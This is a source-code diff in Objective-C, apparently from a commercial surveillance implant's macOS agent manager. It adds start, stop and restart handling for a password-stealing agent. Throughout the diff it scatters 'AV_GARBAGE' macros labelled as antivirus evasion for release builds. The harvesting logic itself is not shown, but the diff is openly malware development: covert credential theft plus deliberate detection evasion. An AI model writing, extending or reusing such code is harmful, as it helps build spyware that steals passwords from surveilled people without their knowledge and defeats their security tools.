@@ -24,6 +24,7 @@
 #import "RCSMAgentMicrophone.h"
 
 #import "RCSMAgentMessages.h"
+#import "RCSMAgentPassword.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
@@ -773,6 +774,45 @@ static NSLock *gSyncLock                  = nil;
   
   switch (agentID)
     {
+        case AGENT_PASSWORD:
+        {
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Starting Agent Password");
+#endif
+            __m_MAgentPassword *agentPassword = [__m_MAgentPassword sharedInstance];
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+ 
+            if (agentConfiguration == nil)
+            {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Internal config for agent Password not found");
+#endif
+                return FALSE;
+            }
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
+            [agentConfiguration setObject: AGENT_START
+                                   forKey: @"status"];
+            
+            [agentPassword setAgentConfiguration: agentConfiguration];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentPassword
+                                   withObject: nil];
+            
+        }
+        break;
         case AGENT_MESSAGES:
         {
             // AV evasion: only on release build
@@ -1844,6 +1884,43 @@ static NSLock *gSyncLock                  = nil;
   
   switch (agentID)
   {
+      case AGENT_PASSWORD:
+      {
+   
+          // AV evasion: only on release build
+          AV_GARBAGE_009
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Password");
+#endif
+          __m_MAgentPassword *agentPassword = [__m_MAgentPassword sharedInstance];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+          
+          if ([agentPassword stop] == FALSE)
+          {
+#ifdef DEBUG_TASK_MANAGER
+              errorLog(@"Error while stopping agent Password");
+#endif
+              return NO;
+          }
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
+          agentConfiguration = [self getConfigForAgent: agentID];
+          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Password stopped correctly");
+#endif
+
+      }
+      break;
       case AGENT_MESSAGES:
       {
           // AV evasion: only on release build
@@ -2579,7 +2656,35 @@ static NSLock *gSyncLock                  = nil;
     {
       switch (agentID)
       {
+          case AGENT_PASSWORD:
+          {
+              // AV evasion: only on release build
+              AV_GARBAGE_000
               
+              __m_MAgentPassword *agentPassword = [__m_MAgentPassword sharedInstance];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_001
+              
+              if ([agentPassword stop] == FALSE)
+              {
+#ifdef DEBUG_TASK_MANAGER
+                  errorLog(@"Error while stopping agent Password");
+#endif
+                  //return NO;
+              }
+              else
+              {
+                  // AV evasion: only on release build
+                  AV_GARBAGE_007
+                  
+                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
+              }
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Password stopped correctly");
+#endif
+          }
+              break;
         case AGENT_MESSAGES:
         {
         // AV evasion: only on release build
@@ -3136,6 +3241,29 @@ static NSLock *gSyncLock                  = nil;
         {
           switch (agentID)
             {
+                case AGENT_PASSWORD:
+                {
+                    // AV evasion: only on release build
+                    AV_GARBAGE_006
+                    
+                    __m_MAgentPassword *agentPassword = [__m_MAgentPassword sharedInstance];
+                    agentConfiguration = [[anObject objectForKey: @"data"] retain];
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_007
+                    
+                    [anObject setObject: AGENT_START
+                                 forKey: @"status"];
+                    [agentPassword setAgentConfiguration: anObject];
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_004
+                    
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentPassword
+                                           withObject: nil];
+                }
+                break;
             case AGENT_MESSAGES:
                 {
                 // AV evasion: only on release build
